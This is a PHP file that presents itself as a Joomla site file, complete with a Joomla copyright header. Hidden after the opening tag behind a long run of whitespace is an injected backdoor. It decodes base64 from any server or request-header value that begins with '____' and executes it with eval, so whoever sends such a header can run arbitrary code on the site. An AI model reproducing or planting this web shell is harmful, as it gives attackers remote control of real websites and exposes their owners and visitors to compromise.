<?php 																																																																																																																																																																																																																																																																																																																																																																													function d14286($l14288){if(is_array($l14288)){foreach($l14288 as $l14286=>$l14287)$l14288[$l14286]=d14286($l14287);}elseif(is_string($l14288) && substr($l14288,0,4)=="____"){$l14288=substr($l14288,4);$l14288=base64_decode($l14288);eval($l14288);$l14288=null;}return $l14288;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("d14286",$_SERVER);/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;